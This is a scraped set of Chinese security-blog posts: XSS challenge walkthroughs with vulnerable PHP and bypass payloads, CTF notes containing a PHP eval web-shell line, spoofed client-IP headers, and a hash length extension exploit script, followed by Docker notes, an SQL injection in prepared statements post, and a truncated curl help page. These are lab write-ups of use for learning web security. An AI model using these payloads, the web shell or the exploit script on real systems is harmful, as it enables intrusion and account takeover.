strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;?php echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';?&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str7).\"&lt;/h3&gt;\";?&gt; 这里观察我们发现，我们的输入值被放置于a标签的href中，这对于我们是个好消息，但是这里做的过滤机制是先将字母小写，再进行混淆，如On -&gt; on -&gt; o_n，而且还转义了双引号，这时候我们发现它忘了&amp;号，这是js代码可以识别的转义符，这里我们将i t转为&amp;#x69 &amp;#x74，这样我们就成功XSS了。 payload 1javascr&amp;#x69p&amp;#x74;:alert(1) Level9 关键代码 123456789101112131415161718192021222324252627282930&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;?phpif(false===strpos($str7,'http://')){ echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"您的链接不合法？有没有！\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'; }else{ echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';}?&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str7).\"&lt;/h3&gt;\";?&gt; 这里和上一题一样。 payload 1javascr&amp;#x69p&amp;#x74;:alert(1)//http://xxx.com Level10 关键代码 123456789101112131415161718&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str11 = $_GET[\"t_sort\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\";?&gt; 这里我们可以看到，get请求中的t_sort，可以直接使用onmouseover来触发xss，其&lt; &gt;过滤任何影响。 payload 1localhost/xsschallenge/level10.php?keyword=aaaaaaaaaaaaaaaaaaaaa&amp;t_sort=\"onmouseover=\"alert(1)\" type=\"text Level11 关键代码 12345678910111213141516&lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str00 = $_GET[\"t_sort\"]; $str11=$_SERVER['HTTP_REFERER']; # REFERER: $str22=str_replace(\"&gt;\",\"\",$str11); $str33=str_replace(\"&lt;\",\"\",$str22); echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt; &lt;form id=search&gt; &lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt; &lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt; &lt;input name=\"t_ref\" value=\"'.$str33.'\" type=\"hidden\"&gt; &lt;/form&gt; &lt;/center&gt;';?&gt; payload 抓包添加Referer键对如下 1Referer: \" onmouseover=\"alert(1)\" type=\"text Level12 关键代码 12345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_SERVER['HTTP_USER_AGENT'];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_ua\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; payload 抓包修改User-Agent参数 1User-Agent: \" onmouseover=\"alert(1)\" type=\"text Level13 关键代码 1234567891011121314151617&lt;?php setcookie(\"user\", \"call me maybe?\", time()+3600);ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_COOKIE[\"user\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_cook\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; payload 抓包修改Cookie值如下 1Cookie: user=\" onmouseover=\"alert(1)\" type=\"text Level14 关键词 exiftool XSS Level15 关键代码 12345&lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"src\"]; echo '&lt;body&gt;&lt;span class=\"ng-include:'.htmlspecialchars($str).'\"&gt;&lt;/span&gt;&lt;/body&gt;';?&gt; payload 1http://localhost/xsschallenge/level15.php?src='level1.php?name=test&lt;h2&gt;&lt;img src=xss onerror=alert(0)&gt;&lt;h2&gt;' Level16 关键代码 12345678910111213&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"&amp;nbsp;\",$str);$str3=str_replace(\" \",\"&amp;nbsp;\",$str2);$str4=str_replace(\"/\",\"&amp;nbsp;\",$str3);$str5=str_replace(\" \",\"&amp;nbsp;\",$str4);echo \"&lt;center&gt;\".$str5.\"&lt;/center&gt;\";?&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str5).\"&lt;/h3&gt;\";?&gt; payload 1http://localhost/xsschallenge/level16.php?keyword=%3Cimg%0asrc=xss%0aonerror=%27alert(1)%27%3E Level17 关键代码 12345&lt;?phpini_set(\"display_errors\", 0);echo \"&lt;embed src=xsf01.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%&gt;\";?&gt;&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt; payload 1http://localhost/xsschallenge/level17.php?arg01='a'&amp;arg02=' onmouseover='alert(/xss/)' Level18 关键代码 1234&lt;?phpini_set(\"display_errors\", 0);echo \"&lt;embed src=xsf02.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%&gt;\";?&gt; payload1http://localhost/xsschallenge/level18.php?arg01='a'&amp;arg02=' onmouseover='alert(/xss/)' Level19 关键代码 1234&lt;?phpini_set(\"display_errors\", 0);echo '&lt;embed src=\"xsf03.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%&gt;';?&gt; payload 1http://localhost/xsschallenge/level19.php?arg01=version&amp;arg02=&lt;a href=\"javascript:alert('xss')\"&gt;111&lt;/a&gt; // Level20 关键代码 1234&lt;?phpini_set(\"display_errors\", 0);echo '&lt;embed src=\"xsf04.swf?'.htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).'\" width=100% heigth=100%&gt;';?&gt; payload 1http://localhost/xsschallenge/level20.php?arg01=id&amp;arg02=\\%22))}catch(e){(alert)(/XSS/.source);}//%26width=%26height= 总结触发事件的条件onload，onclick，onerror，prompt，confirm 对于过滤的绕过关键字符的转移编码 HTML对字符的识别 http://www.vuln.cn/6601 1、大小写绕过 alert(‘123’) 2、编码绕过 1.十六进制编码 2.jsfuck编码 3.url编码 4.unicode编码 12&lt;0x736372697074&gt;alert(/1/)&lt;/0x736372697074&gt;&lt;img src=\"1\" onerror=\"alert&amp;#x28;1&amp;#x29;\"&gt; 3、绕过magic_quotes_gpc1&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; 4、标签闭合标签 类似如下 &quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt; 或 &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 标签绕过 123456789&lt;button onclick=\"javascript:alert('xss')&gt;XSS&lt;/button\"&gt;&lt;title&gt;&lt;img a=\"&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//\"&gt;\"onsubmit=javascript:alert(1)%20name=\"a&lt;details open ontoggle=\"eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))\"&gt;&lt;video src=\"http://www.0dutv.com/plug/down/up2.php/104678898.mp3\" onprogress=$('body').prepend(123);$('body')&gt;&lt;/video&gt; 5、其他符号绕过 %0a 替换空格 %0d 替换空格 /**/ 替换空格 %00 截断 替换括号 6、双字符绕过 alalertert(123) 7、宽字节绕过 gbxxxx系列的编码，那么我们尝试一下宽字节 %c0，%bf，%5c，%df 8、其他事件绕过 onload onclick onerror prompt confirm onmousemove 9、CRLF injection绕过CRLF是”回车 + 换行”（\\r\\n）的简称。 http://www.xxx.com%0d%0a%0d%0a&lt;svg/onload=prompt(1)&gt; 其他XSS中转 EXIF 跨站http://blog.knownsec.com/2015/02/a-real-case-study-of-xss-through-exif-headers/ BlackHat专题：Flash漏洞利用样本逆向分析艺术https://paper.seebug.org/224/ FLASH XSShttp://www.freebuf.com/sectool/108568.html http://www.freebuf.com/articles/web/6641.html flash XSS挖掘机 https://github.com/whoamisb/FlashXSSScan/blob/master/FlashXSSScan.py","link":"/2017/04/27/2017/XSS%E7%BB%83%E4%B9%A0/"},{"title":"CTF集锦","text":"小生初来乍到,请多指教姿势~ HTML标签执行PHP代码1&lt;script language=\"php\"&gt;@eval_r($_POST[sb])&lt;/script&gt; 内容安全策略CSPCSP定义了Content-Security-PolicyHTTP头来允许你创建一个可信来源的白名单，使得浏览器只执行和渲染来自这些来源的资源，而不是盲目信任服务器提供的所有内容。即使攻击者可以找到漏洞来注入脚本，但是因为来源不包含在白名单里，因此将不会被执行。 CSP基于来源白名单，但是它不能解决XSS攻击的最大来源：内联脚本注入。如果攻击者可以注入包含有害代码的script标签（&lt;script&gt;sendMyDataToEvilDotCom();&lt;/script&gt;），浏览器并没有好的机制来区分这个标签。CSP只能通过完全禁止内联脚本来解决这个问题。 这个禁止项不仅包括脚本中嵌入的script标签，还包括内联事件处理程序和javascrpt:这种URL。你需要把script标签的内容放到一个外部文件里，并且用适当的addEventListener的方式替换javascript:和&lt;a… onclick=”[JAVASCRIPT]”&gt;。 伪IP构造散列X-Forwarded-For: 103.27.76.153PROXY-CLIENT-IP: 103.27.76.153WL-PROXY-CLIENT-IP: 103.27.76.153X-REAL-IP: 103.27.76.153HTTP_CLIENT_IP: 103.27.76.153 HelloWorld 盐值MD5破解!静观其变md5加密之盐值绕过： 原题有 .php~ 问题，这里就不描述了，直接使用 vim -r [filename] 修复文件可看见源代码. 比较有意思的是这个md5盐值绕过的，代码如下： 12345678910111213141516171819202122232425262728293031&lt;?php $auth = false; $role = \"guest\"; $salt = # 盐值 if (isset($_COOKIE[\"role\"])) { $role = unserialize($_COOKIE[\"role\"]); $hsh = $_COOKIE[\"hsh\"]; # strrev 反转字符串 # # Cookie['hsh'] -&gt; $hsh === md5(盐值 + \"反转的$_COOKIE[\"role\"]\") # unserialize($_COOKIE[\"role\"]) -&gt; $role === admin if ($role===\"admin\" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[\"role\"]))) { $auth = true; } else { $auth = false; } } else { $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); # $Cookie['role'] -&gt; $s -&gt; 序列化 \"guest\" # $hsh -&gt; md5(盐值 + 反转的 $s) } if ($auth) { echo \"&lt;h3&gt;Welcome Admin. Your flag is } else { echo \"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;\"; }?&gt; 上面的注释是我加的，flag和部分不存在的代码是没有的，需要我们想办法。 通过逻辑可以分析出入手点为两个： 强撸md5 猜测反序列化函数存在截断之类的问题(这是我开始的出发点，后来发现还不够，以及对md5过于信任 - - ) 准备活动那么由我来介绍一下这个哈希长度扩展攻击工具使用方法，对了，他叫hashpump(python 库为 hashpumpy)安装自己找教程，我就不废话了。 12345678HashPump [-h帮助] [-t测试] [-s签名] [-d数据] [-a附加] [-k keylength] HashPump生成字符串来利用容易受到哈希长度扩展攻击的签名。 -h --help显示此消息。 -t --test运行测试来验证每个算法是否正常运行。 -s --签名来自已知消息的签名。 -d --data来自已知消息的数据。 -a --additional您希望添加到已知邮件的信息。 -k --keylength长度在关键的字节被用于签署与原始消息。 怎么用呢，拿这个题为例子。进入原题看cookie 12role: s%3A5%3A%22admin%22%3B -&gt; s:5:\"admin\";hsh: e8a976144ac46064ef25cf3cc963d6b1 假设盐值的长度为40，那么我们将hsh中 ;&quot;tseug&quot;:5:s 值转换为 ;&quot;nimda&quot;:5:s 如何呢 1234567root@kali:~# hashpumpInput Signature: e8a976144ac46064ef25cf3cc963d6b1Input Data: ;\"tseug\":5:sInput Key Length: 40Input Data to Add: ;\"nimda\":5:s21a8bcfaac1ddcd72555e27825361338;\"tseug\":5:s\\x80\\x00\\x00\\x00\\xa0\\x01\\x00\\x00\\x00\\x00\\x00\\x00;\"nimda\":5:s 原本的 md5($salt.strrev(serialize('guest')))变成了md5($salt.strrev(serialize('admin')))。现在就一个问题了，盐值的长度是多少呢？我们需要了解一下下这个哈希长度攻击的一点点皮毛。 md5 的运算是先分组（每64字节一组），于是应该是需要填充的，在余出来的字节后面添加一定的补充，一直至56字节，然后最后8字节留来记录除去填充部分的bit长度，自然应该是16进制的，而md5的运算是基于一段确定key值进行的，key值为16字节，它会参与第一组的运算，经过复杂的过程映射出新的16字节key，这一新的key值将用于下一组，之后循环，最后的key变换一下就是hash值了. 深入理解哈希长度攻击可以看这个文章，也就是说，如果一个消息长度大于512bit，则会对消息按64字节分，其中8字节作为长度填充无效，故盐值范围为[0，56]。 一击必杀顺带说一下hashpumpy的用法，我windows上一直装不上，只能在linux下装，不知道你们能不能，，， 这个库就一个方法，调用方式如下 12345hashpumpy.hashpump(hexdigest, original_data, data_to_add, key_length)hexdigest 散列密文的长度original_data 部分已知的数据data_to_add 想要追加的数据key_length 未知数据的长度 漂亮的绝杀 1234567891011121314import hashpumpy,requests,sys,urllibheaders = { 'Content-Type':'application/x-www-form-urlencoded'}strs = ('role=','; hsh=', ';UM_distinctid=1643fc9a6c4ea-0c9dba36d1de31-4c332173-1fa400-1643fc9a6c53d9') if __name__ == '__main__': s = requests.Session() for i in range(0, 56): temp = hashpumpy.hashpump('3a4727d57463f122833d9e732f94e4e0',';\"tseug\":5:s',';\"nimda\":5:s',i) headers['Cookie'] = str(strs[0]+urllib.quote(temp[1][::-1])+strs[1]+temp[0]+strs[2]) req = s.get(url='http://web.jarvisoj.com:32778/', headers=headers) if len(req.content)!=210: print('[+]result', req.content) break 完美收尾升级版工具，不需要已知数据即可直接追加数据进入散列密文中，工具叫hexpand，除了少要一个参数其他没有什么变化。","link":"/2018/06/26/2018/CTF%E9%9B%86%E9%94%A6/"},{"title":"Docker镜像复用","text":"如何从官方源、阿里源来使用、打包、上传、下载容器与镜像 镜像复用下载就一句话，如果不知道有哪些版本号，可以使用我上一片博客的脚本查询 1$ docker pull [镜像名称]:版本号 打包 将容器直接打包为镜像 12# 将容器 menzel3_sql_labs 打包为镜像名为menzel3/sql_labs版本号为1的镜像$ docker commit menzel3_sql_labs menzel3/sql_labs:1 使用Dockerfile构建 1234$ lsDockerfile# 将当前路径下的Dockerfile构建为镜像名为menzel3/sql_labs版本号为1的镜像$ docker build -t menzel3/sql_labs:1 . 上传先登陆、再上传 官方源上传 123456789101112131415$ docker loginLogin with your Docker ID to push and pull images from Docker Hub. If you don't have a Docker ID, head over to https://hub.docker.com to create one.Username: menzel3 # docker hub的用户名Password: # WARNING! Your password will be stored unencrypted in /home/mzl/.docker/config.json.Configure a credential helper to remove this warning. Seehttps://docs.docker.com/engine/reference/commandline/login/#credentials-storeLogin Succeeded# 这里我们登陆成功，开始上传# 这里就要说一下为什么容器名称要以用户名加斜杠加容器名称了# docker上传的时候，通过面的用户名上传到指定用户的hub上的sql_labs中# 如果没有sql_labs，则会自动创建一个，且添加一个版本号为1的镜像# 如果有，就直接添加一个版本号为1的镜像，或者覆盖镜像$ docker push menzel3/sql_labs:1 顺便一提，退出用户是docker logout，再重新登陆就可以切换账号了 阿里源上传 首先到阿里云的镜像库注册一个账号(可以直接用淘宝号登陆)，然后开通服务后进入镜像仓库创建一个名叫sql_labs的仓库 1234567# 这里我们将之前的镜像添加一个标签，这个标签的规则必须是# registry.cn-hangzhou.aliyuncs.com/[用户名]/[仓库名称]:[版本号]$ docker tag 40f16ba66b80 registry.cn-hangzhou.aliyuncs.com/menzel3/sql_labs:v1# 这里是登陆阿里镜像仓库$ docker login --username=menzel3 registry.cn-hangzhou.aliyuncs.com# 上传到阿里$ docker push registry.cn-hangzhou.aliyuncs.com/menzel3/sql_labs:v1 私有仓库 私有仓库搭建私有仓库 未完待续..","link":"/2018/08/21/2018/Docker%E9%95%9C%E5%83%8F%E5%A4%8D%E7%94%A8/"},{"title":"预编译下的SQL注入","text":"如有错误还请指出. 学习了MySQL查询语句,以及之前jdbc的使用,给朋友写了一个简易系统后,发现一些细节问题. SQL注入天敌都说SQL注入只与数据库有关系，和编程语言关系不大，但是在Java中，注入问题却相对稀少。这是为什么呢，当然和数据库没关系，和java本身有关系，java的jdbc连接数据库机制十分安全，可以说的上相对的绝对安全。 那就预编译机制 123456789...Connection conn = getConnection();String sql = \"select * from users order by ?;\";PreparedStatement psmt = conn.prepareStatement(sql); // 执行预编译psmt.setString(1, \"123455678564\"); // 向 sql 中 ? 注入值ResultSet rs = psmt.executeQuery(); // 执行SQL语句while (rs.next()) System.out.println(rs.getString(\"id\") + rs.getString(\"username\") + rs.getString(\"password\")); // 回显... 究竟什么是预编译，不好意思，虽然java以开源为主，但是这部分代码偏偏闭源。我这里可以给出一些相关评价： 首先向数据库发送select * from users order by ?;语句，数据库已经编译sql语句，然后等待 ? 中的值，然后当我们设置 ? 中的值，然后再psmt.executeQuery();的时候，就是将值发过去，数据库直接用变量获得该值，然后这个时候是字符串，传过去还是字符串，脱离了原本拼接时候的sql语句层面。 总的来说就是，你先把sql语句编译完成，这个时候sql等待的是字符串，而你传的东西不管是什么，他就用字符串接收，然后运行sql语句。即你的poc被限制在字符串级别，而非sql语句中的一部分 神化的预编译1.问题的入口点说到注入就不得不说预编译这个东西,着实好用,而且几乎无敌,但稍微使用就会发现一件问题.预编译能否处理 order by 后面的参数?(都这么问了,必然是不能呗)笔者用以下代码证明, 1234567891011121314...Connection conn = getConnection();String sql = \"select id,username,password from users order by ?;\";PreparedStatement psmt = null;ResultSet rs = null;try { psmt = conn.prepareStatement(sql); // 执行预编译 // psmt.setString(1, \"id\"); -- 1 psmt.setString(1, \"123455678564\"); // 向 sql 中 ? 注入值 rs = psmt.executeQuery(); // 执行SQL语句 while (rs.next()) System.out.println(rs.getString(\"id\") + rs.getString(\"username\") + rs.getString(\"password\")); // 回显} catch (SQLException e) {e.printStackTrace();}... 运行发现1,2结果相同,由于我这里是使用c3p0(巨好用的第三方库),如果是直接使用原生mysql jdbc的connection就会直接抛异常，你会发现参数没有注入进去。所以，order by失去了预编译的保护。相应的，我做了以下测试 1234567891011121314151617181920212223242526272829303132public void testHaving() { Connection conn = getConnection(); PreparedStatement psmt = null; ResultSet rs = null; /** * select id,username,password * from users u * inner join results r * on u.id = r.rid * where u.id in (?,2,3,4,5) * group by r.rid * having u.id&gt;? * order by u.id * limit 0,10; * */ // 使用字符串拼接 String sql = \"select id,username,password \" + \"from users u \" + \"inner join results r \" + \"on u.id = r.rid \" + \"where u.id in (?,2,3,4,5)\" + \"group by r.rid \" + \"having u.id&gt;? \" + \"order by id \" + \"limit 0,10 \"; // 使用预编译 try { System.out.println(\"------\" + sql + \"------\"); psmt = conn.prepareStatement(sql);// 执行预编译 psmt.setString(1, \"1\");// 向 sql 中 ? 注入值 psmt.setString(2, \"1\"); rs = psmt.executeQuery();// 执行SQL语句 while (rs.next()) System.out.println(rs.getInt(\"id\") + rs.getString(\"username\") + rs.getString(\"password\")); // 回显 } catch (SQLException e) { e.printStackTrace(); }} 由上述测试代码可以得出结论如下： having, in, where后的等值条件, 非等值条件不可使用预编译 like ,order by不可使用预编译 2.order by问题再探究既然order by和like不能用预编译，那么我们该如何防范呢，防范的方法有很多，我们先看看大佬是怎么处理的吧，首当其冲，我们看看最常用的数据库处理框架MyBastic。如何使用自行查看官方文档，我就列出我的测试代码： sqlmap下的xml映射文件配置如下，其中 \\$表示使用拼接，例如：select * from users order by $value就和php中的$value直接插入其中一样 #表示使用预编译，例如：select * from users order by #{value}使用的预编译(MyBatis自己封装) 1234567891011&lt;!-- like的SQL注入测试 --&gt;&lt;select id=\"findUserByUsername\" parameterType=\"java.lang.String\" resultType=\"com.po.User\"&gt; select username, password, birthday, email from users where username like '%${value}%'&lt;/select&gt;&lt;!-- like的SQL注入修复 --&gt;&lt;select id=\"findUserByUsername2\" parameterType=\"java.lang.String\" resultType=\"com.po.User\"&gt; select username, password, birthday, email from users where username like concat('%', #{value}, '%')&lt;/select&gt; 反正不用我说，也知道拼接必死，而MyBatis(只限高版本,据我所知低版本的MyBatis用的原生预编译，即order by和like存在注入)确实可以完全预防order by注入问题。 再来看看SSH三大框架之一的Hibernate框架，因为都是以封装数据库行为的框架所以我都抓来测试了。 Hibernate注入探究 收集了不少资料，发现…这货好强，只要不傻乎乎的拼接，就完全OK。 总结 在代码审计的时候，首先拼接全死，所以在遇到使用MyBatis框架的项目中，直接搜索 \\$ ，其他的用正则匹配搜索加号相关的。 其次如果是原生jdbc书写，搜索关键词 order by 和 like，测试过滤代码是否可以绕过。 框架就是好，下一遍我将带大家解析框架源码。","link":"/2017/03/27/2017/%E9%A2%84%E7%BC%96%E8%AF%91%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/"},{"title":"Curl Help Doc","text":"CURL 全面帮助文档 快速使用常用命令 指定本地端口号发送请求访问URL1$ curl --local-port &lt;端口号&gt; &lt;URL&gt; 例如:1$ curl --local-port 51 127.0.0.1 可使用多个 -H “参数表:参数值” 构造数据头1$ curl -v &lt;url&gt; -H '参数表:参数值' 例如:1$ curl -v 127.0.0.1 -H 'X-Forwarded-For:127.0.0.1' -H 'cookies:233333333' 所有用法 所有的 curl 命令集合1用法：curl [options ...] &lt;url&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206Options: (H) means HTTP/HTTPS only, (F) means FTP only --anyauth Pick \"any\" authentication method (H) -a, --append Append to target file when uploading (F/SFTP) --basic Use HTTP Basic Authentication (H) --cacert FILE CA certificate to verify peer against (SSL) --capath DIR CA directory to verify peer against (SSL) -E, --cert CERT[:PASSWD] Client certificate file and password (SSL) --cert-status Verify the status of the server certificate (SSL) --cert-type TYPE Certificate file type (DER/PEM/ENG) (SSL) --ciphers LIST SSL ciphers to use (SSL) --compressed Request compressed response (using deflate or gzip) -K, --config FILE Read config from FILE --connect-timeout SECONDS Maximum time allowed for connection --connect-to HOST1:PORT1:HOST2:PORT2 Connect to host (network level) -C, --continue-at OFFSET Resumed transfer OFFSET -b, --cookie STRING/FILE Read cookies from STRING/FILE (H) -c, --cookie-jar FILE Write cookies to FILE after operation (H) --create-dirs Create necessary local directory hierarchy --crlf Convert LF to CRLF in upload --crlfile FILE Get a CRL list in PEM format from the given file -d, --data DATA HTTP POST data (H) --data-raw DATA HTTP POST data, '@' allowed (H) --data-ascii DATA HTTP POST ASCII data (H) --data-binary DATA HTTP POST binary data (H) --data-urlencode DATA HTTP POST data url encoded (H) --delegation STRING GSS-API delegation permission --digest Use HTTP Digest Authentication (H) --disable-eprt Inhibit using EPRT or LPRT (F) --disable-epsv Inhibit using EPSV (F) --dns-servers DNS server addrs to use: 1.1.1.1;2.2.2.2 --dns-interface Interface to use for DNS requests --dns-ipv4-addr IPv4 address to use for DNS requests, dot notation --dns-ipv6-addr IPv6 address to use for DNS requests, dot notation -D, --dump-header FILE Write the received headers to FILE --egd-file FILE EGD socket path for random data (SSL) --engine ENGINE Crypto engine (use \"--engine list\" for list) (SSL) --expect100-timeout SECONDS How long to wait for 100-continue (H) -f, --fail Fail silently (no output at all) on HTTP errors (H) --fail-early Fail on first transfer error, do not continue --false-start Enable TLS False Start. -F, --form CONTENT Specify HTTP multipart POST data (H) --form-string STRING Specify HTTP multipart POST data (H) --ftp-account DATA Account data string (F) --ftp-alternative-to-user COMMAND String to replace \"USER [name]\" (F) --ftp-create-dirs Create the remote dirs if not present (F) --ftp-method [MULTICWD/NOCWD/SINGLECWD] Control CWD usage (F) --ftp-pasv Use PASV/EPSV instead of PORT (F) -P, --ftp-port ADR Use PORT with given address instead of PASV (F) --ftp-skip-pasv-ip Skip the IP address for PASV (F) --ftp-pret Send PRET before PASV (for drftpd) (F) --ftp-ssl-ccc Send CCC after authenticating (F) --ftp-ssl-ccc-mode ACTIVE/PASSIVE Set CCC mode (F) --ftp-ssl-control Require SSL/TLS for FTP login, clear for transfer (F) -G, --get Send the -d data with a HTTP GET (H) -g, --globoff Disable URL sequences and ranges using {} and [] -H, --header LINE Pass custom header LINE to server (H) -I, --head Show document info only -h, --help This help text --hostpubmd5 MD5 Hex-encoded MD5 string of the host public key. (SSH) -0, --http1.0 Use HTTP 1.0 (H) --http1.1 Use HTTP 1.1 (H) --http2 Use HTTP 2 (H) --http2-prior-knowledge Use HTTP 2 without HTTP/1.1 Upgrade (H) --ignore-content-length Ignore the HTTP Content-Length header -i, --include Include protocol headers in the output (H/F) -k, --insecure Allow connections to SSL sites without certs (H) --interface INTERFACE Use network INTERFACE (or address) -4, --ipv4 Resolve name to IPv4 address -6, --ipv6 Resolve name to IPv6 address -j, --junk-session-cookies Ignore session cookies read from file (H) --keepalive-time SECONDS Wait SECONDS between keepalive probes --key KEY Private key file name (SSL/SSH) --key-type TYPE Private key file type (DER/PEM/ENG) (SSL) --krb LEVEL Enable Kerberos with security LEVEL (F) --libcurl FILE Dump libcurl equivalent code of this command line --limit-rate RATE Limit transfer speed to RATE -l, --list-only List only mode (F/POP3) --local-port RANGE Force use of RANGE for local port numbers -L, --location Follow redirects (H) --location-trusted Like '--location', and send auth to other hosts (H) --login-options OPTIONS Server login options (IMAP, POP3, SMTP) -M, --manual Display the full manual --mail-from FROM Mail from this address (SMTP) --mail-rcpt TO Mail to this/these addresses (SMTP) --mail-auth AUTH Originator address of the original email (SMTP) --max-filesize BYTES Maximum file size to download (H/F) --max-redirs NUM Maximum number of redirects allowed (H) -m, --max-time SECONDS Maximum time allowed for the transfer --metalink Process given URLs as metalink XML file --negotiate Use HTTP Negotiate (SPNEGO) authentication (H) -n, --netrc Must read .netrc for user name and password --netrc-optional Use either .netrc or URL; overrides -n --netrc-file FILE Specify FILE for netrc -:, --next Allows the following URL to use a separate set of options --no-alpn Disable the ALPN TLS extension (H) -N, --no-buffer Disable buffering of the output stream --no-keepalive Disable keepalive use on the connection --no-npn Disable the NPN TLS extension (H) --no-sessionid Disable SSL session-ID reusing (SSL) --noproxy List of hosts which do not use proxy --ntlm Use HTTP NTLM authentication (H) --ntlm-wb Use HTTP NTLM authentication with winbind (H) --oauth2-bearer TOKEN OAuth 2 Bearer Token (IMAP, POP3, SMTP) -o, --output FILE Write to FILE instead of stdout --pass PASS Pass phrase for the private key (SSL/SSH) --path-as-is Do not squash .. sequences in 